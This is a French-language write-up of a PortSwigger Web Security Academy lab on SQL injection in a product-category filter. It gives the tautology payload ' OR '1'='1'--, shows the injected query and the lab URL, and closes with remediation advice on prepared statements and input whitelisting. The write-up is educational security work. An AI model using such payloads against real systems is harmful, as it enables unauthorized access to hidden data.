# Lab 1 — SQL Injection dans une clause WHERE

**Source** : PortSwigger Web Security Academy
**Titre du lab** : Vulnérabilité d'injection SQL dans la clause WHERE permettant la récupération de données cachées
**Statut** : ✅ Résolu

## Objectif

L'application affiche un catalogue de produits filtrable par catégorie via le paramètre `category` dans l'URL. Le but est d'exploiter une injection SQL dans la clause WHERE pour afficher des produits cachés (non destinés à la vue publique).

## Contexte

La page de filtre construit dynamiquement une requête SQL en insérant directement la valeur du paramètre `category` dans la clause WHERE, sans validation .

URL vulnérable :https://[ID].web-security-academy.net/filter?category=Accessories
## Vulnérabilité

Injection SQL non filtrée dans le paramètre `category`, permettant de modifier la logique de la requête SQL backend.

## Exploitation

**Payload utilisé** :Accessories' OR '1'='1'--
**URL finale** :https://0ae200e30370c5b382fecea800f400cd.web-security-academy.net/filter?category=Accessories%27%20OR%20%271%27=%271%27--
**Explication** :
- `'` ferme la chaîne de caractères attendue par la requête SQL
- `OR '1'='1'` ajoute une condition toujours vraie, ce qui fait correspondre la requête à toutes les lignes de la table (y compris les produits masqués)
- `--` commente le reste de la requête SQL pour éviter une erreur de syntaxe

La requête backend, initialement de ce type :
```sql
SELECT * FROM products WHERE category = 'Accessories' AND released = 1
```

devient :
```sql
SELECT * FROM products WHERE category = 'Accessories' OR '1'='1'--' AND released = 1
```

La condition `OR '1'='1'` étant toujours vraie, tous les produits sont retournés, y compris ceux non publiés (`released = 0`).

## Résultat

Le lab a été marqué comme **Résolu**, confirmant que des produits cachés ont bien été récupérés.

## Impact

Un attaquant peut contourner les filtres applicatifs pour accéder à des données non destinées à être publiques (produits non publiés, informations sensibles selon le contexte).

## Remédiation

- Utiliser des **requêtes préparées (prepared statements)** avec paramètres liés, plutôt que de concaténer directement les entrées utilisateur dans la requête SQL
- Valider et filtrer strictement les entrées utilisateur (whitelist des catégories valides)
- Appliquer le principe du moindre privilège sur le compte de base de données utilisé par l'application
